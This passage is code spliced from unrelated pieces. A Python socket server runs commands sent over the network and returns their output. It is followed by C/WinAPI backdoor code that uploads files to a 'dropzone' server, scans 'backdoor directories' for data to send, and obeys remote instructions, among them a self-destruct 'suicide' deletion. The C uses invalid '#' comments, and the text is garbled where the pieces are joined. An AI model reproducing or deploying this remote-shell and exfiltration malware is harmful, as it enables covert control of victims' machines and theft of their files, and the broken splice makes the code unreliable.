                conn.send(output.stderr.read())
        except Exception as e:
            conn.send(str(e).encode())
    print(f"[-] Connection from {addr} closed.")
    conn.close()

# Function to start listening for connections
def start_listening(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        conn, addr = server.accept()
        client_thread = threading.Thread(target=handle_connection, args=(conn, addr))
        client_thread.start()

# Main function
def start():
    host = "0.0.0.0"  # Listen on all available interfaces
    port = 9999
    start_listening(host, port)

if __name__ == "__main__":
    start()


  # Specify the dropzone HTTP server.

  mbstowcs(mwUploadServer, gUploadServer, MAX_BUF_SIZE);
  if (hSession)
    hConnect = WinHttpConnect(hSession, mwUploadServer, INTERNET_DEFAULT_HTTP_PORT, 0);
  else {
    mRetVal = 2;
    goto END_HTTP_UPLOAD;
  }


  # Create the HTTP request handle.

  mbstowcs(mwUploadScript, HTTP_INPUT_SCRIPT, MAX_BUF_SIZE);
  if (hConnect)
    hRequest = WinHttpOpenRequest(hConnect, L"POST", mwUploadScript, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  else {
    mRetVal = 3;
    goto END_HTTP_UPLOAD;
  }


  # Add the HTTP content type.


  if (hRequest)
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded", 47, WINHTTP_ADDREQ_FLAG_ADD);
  else {
    mRetVal = 4;
    goto END_HTTP_UPLOAD;
  }


  if ((mFH = fopen(pFileName, "r")) != NULL)
  {
    stat(pFileName, &mSB);


    # Determine base file name.

    ZeroMemory(mBuffer, sizeof(mBuffer));
    if (strchr(pFileName, '/') != NULL)
    {
      mBaseNameB64EncodedFile = strrchr(pFileName, '/');
      mBaseNameB64EncodedFile++;
    } else if (strchr(pFileName, '\\') != NULL) {
      mBaseNameB64EncodedFile = strrchr(pFileName, '\\');
      mBaseNameB64EncodedFile++;
    } else {
      mBaseNameB64EncodedFile = pFileName;
    }

    snprintf(mBuffer, MAX_BUF_SIZE, "%s%s&cl=%d&%s%s&%s", PHP_LIID_VAR_NAME, gLIID, mSB.st_size, PHP_FILENAME_VAR_NAME, mBaseNameB64EncodedFile, PHP_DATA_VAR_NAME);


    # Send the HTTP request.

    if (hRequest) 
      bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, mSB.st_size + strlen(mBuffer), 0);
    else {
      mRetVal = 5;
      goto END_HTTP_UPLOAD;
    }


    # Write first data chunk.

    bResults = WinHttpWriteData(hRequest, mBuffer, strlen(mBuffer), &dwBytesWritten);
    ZeroMemory(mBuffer, sizeof(mBuffer));

    while (fgets (mBuffer, MAX_BUF_SIZE, mFH) != NULL)
    {
      mSizeCounter+= strlen(mBuffer);
      # send data to the server.
      bResults = WinHttpWriteData(hRequest, mBuffer, strlen(mBuffer), &dwBytesWritten);
      ZeroMemory(mBuffer, sizeof(mBuffer));
    }

    fclose(mFH);
    mFH = NULL;
#    bResults = WinHttpWriteData(hRequest, " ", 1, &dwBytesWritten);

  } else {
    mRetVal = 6;
    goto END_HTTP_UPLOAD;
  }


  # Receive the dropzone response.

  if (bResults)
    bResults = WinHttpReceiveResponse(hRequest, NULL);
  else {
    mRetVal = 7;
    goto END_HTTP_UPLOAD;
  }


  # report any errors.
  if (!bResults)
  {
    mRetVal = 8;
    goto END_HTTP_UPLOAD;
  } else {


    # Read HTTP response data

    do 
    {


      # Check for available data.

      dwSize = 0;
      if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
        goto END_HTTP_UPLOAD;

      mTotalBytes += dwSize;
	

      # Allocate space for the buffer.

      if ((pszOutBuffer = (char *) HeapAlloc(GetProcessHeap(), 0 , dwSize + 1)) == NULL)
      {
        dwSize = 0;
        pszOutBuffer = NULL;
        goto END_HTTP_UPLOAD;
       } else {


        # Read the data.

        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID) pszOutBuffer, dwSize, &dwDownloaded))
          goto END_HTTP_UPLOAD;


        # If transmission was successful, delete only the b64-file
        # the rest will be deleted by the calling function

        if (strstr(pszOutBuffer, HTTP_TRANSMISSION_OK) != NULL)
        {
          DeleteFile(pFileName); # remove the b64 data file
          mRetVal = 0;
        }

        if (pszOutBuffer != NULL)
        {
          HeapFree(GetProcessHeap(), 0, pszOutBuffer);
          pszOutBuffer = NULL;
        }  # if (pszOutBuffer != NULL)
      } # if (HeapAlloc() ...)
    } while (dwSize > 0);
  } # if (!bResults)


END_HTTP_UPLOAD:


  # Release allocated resources.

  if (hRequest) WinHttpCloseHandle(hRequest);
  if (hConnect) WinHttpCloseHandle(hConnect);
  if (hSession) WinHttpCloseHandle(hSession);
  if (mFH) fclose(mFH);

  if (pszOutBuffer != NULL)
  {
    HeapFree(GetProcessHeap(), 0, pszOutBuffer);
    pszOutBuffer = NULL;
  }

  return(mRetVal);
}

 
# ix) CLEANUP


  # Check all possible backdoor directories for uploadable files.

  for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));

    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      
      
      # Make sure the directory name ends with a backslash.

      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");
    
      if (gBaseDirectory[strlen(gBaseDirectory) - 1] != '\\')
        strcat(gBaseDirectory, "\\");


      # Check if the CALLID file exists.

      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, CALLID_FILENAME);
      if (PathFileExists(mUploadDirFullPath))
        mRetVal++;   


      # Check if the UPLOAD directory exists.

      ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));
      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, BD_DATA_DIR);

      if (mUploadDirFullPath[strlen(mUploadDirFullPath) - 1] != '\\')
        strcat(mUploadDirFullPath, "\\");

      if (PathFileExists(mUploadDirFullPath))
        mRetVal++;  


      if (mRetVal > 0)
        break;
    } # if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
  }  # for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)

  return(mRetVal);
}    


# We received status information/instructions from the dropzone.
# Process the instructions.

void remoteStatusChecks(char *pStatusInformation)
{
  FILE *mFH = NULL;
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  char *mTempPointer = 0;
  char mTemp[MAX_BUF_SIZE + 1];

  int mRemoteStatus = 0;
  int mRemoteStatusEntries = 0;
  int mCounter = 0;
  int mRemoteStatusArray[MAX_BUF_SIZE];


  mTempPointer = pStatusInformation;
  mCounter = 0;

  while (mTempPointer[mCounter] != NULL)
  {
    if (mTempPointer[mCounter] == '\n' || mTempPointer[mCounter] == '\r')
      mTempPointer[mCounter] = ' ';
    mCounter++;
  }
        

  # Extract status data.

  ZeroMemory(mRemoteStatusArray, sizeof(mRemoteStatusArray));
  mRemoteStatus = 0;
  if (strstr(pStatusInformation, "status=") != NULL)
  {
    mTempPointer = strstr(pStatusInformation, "status") + strlen("status") + 1;

    if (strchr(mTempPointer, '&') != NULL)
    {
      ZeroMemory(mTemp, sizeof(mTemp));
      mCounter = 0;

      while (mTempPointer[mCounter] != '&' && mTempPointer[mCounter] != NULL)
        mCounter++;

      strncpy(mTemp, mTempPointer, mCounter);
      mRemoteStatus = atoi(mTemp);
    }
  }


  # Fill in the "remote status array" values.

  while (gRemoteStatusInformationNames[mRemoteStatusEntries] != NULL) 
    mRemoteStatusEntries++;

  mCounter = 0;
  mRemoteStatusEntries -= 1;


  while (mRemoteStatusEntries >= 0)
  {
    if (mRemoteStatus >= gRemoteStatusInformationValues[mRemoteStatusEntries])
    {
      mRemoteStatusArray[mRemoteStatusEntries] = 1;
      mRemoteStatus -= gRemoteStatusInformationValues[mRemoteStatusEntries];
    } else
      mRemoteStatusArray[mRemoteStatusEntries] = 0;

    mRemoteStatusEntries--;
  } 


  mRemoteStatusEntries = 0;
  while (gRemoteStatusInformationNames[mRemoteStatusEntries] != NULL) 
    mRemoteStatusEntries++;

  mRemoteStatusEntries -= 1;

  # viii) FINAL SUICIDE DEL.
  

  # if we received a delete instruction, launch STRUCTURE deletion.

  if (mRemoteStatusArray[VR_DELETE_IT] == 1)
  {
    deleteEverything();
    exit(0);
  }
}


##########################-